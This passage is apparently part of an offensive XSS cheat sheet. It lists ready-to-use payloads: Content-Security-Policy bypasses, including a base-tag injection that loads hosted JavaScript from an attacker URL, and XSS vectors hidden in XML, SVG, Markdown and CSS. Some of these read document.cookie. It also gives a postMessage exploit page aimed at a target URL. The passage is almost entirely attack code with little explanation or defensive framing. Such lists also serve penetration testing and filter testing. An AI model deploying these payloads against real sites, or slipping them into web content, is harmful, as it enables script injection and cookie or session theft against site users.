**script-src 'self' Bypass:**
```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

**script-src 'self' data: Bypass:**
```html
<script src="data:,alert(1)"></script>
```

**Nonce Bypass (Base Tag Injection):**
```html
<base href=http://{ATTACKER_URL}>
<!-- Then host malicious JS at same path as legitimate script on target -->
<!-- Example: If target has /js/app.js, host your payload at http://{ATTACKER_URL}/js/app.js -->
```

**PHP Header Bypass:**
Generate PHP warning to prevent CSP header:
```
GET /?xss=<script>alert(1)</script>&a&a&a...[REPEATED 1000 times]
```

### XSS in Files

**XSS in XML:**
```xml
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
```

**XSS in SVG:**
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
```

**XSS in Markdown:**
```markdown
[a](javascript:prompt(document.cookie))
[a](j a v a s c r i p t:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
```

**XSS in CSS:**
```html
<style>
div {
    background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
}
</style>
```

### XSS in PostMessage

**Exploit if target origin is asterisk (*):**
```html
<script>
window.poc = window.open('http://{TARGET_URL}/#login');
setTimeout(function(){
    window.poc.postMessage({
        "sender": "accounts",
        "url": "javascript:{PAYLOAD}",
    }, '*');
}, 2000);
</script>
```

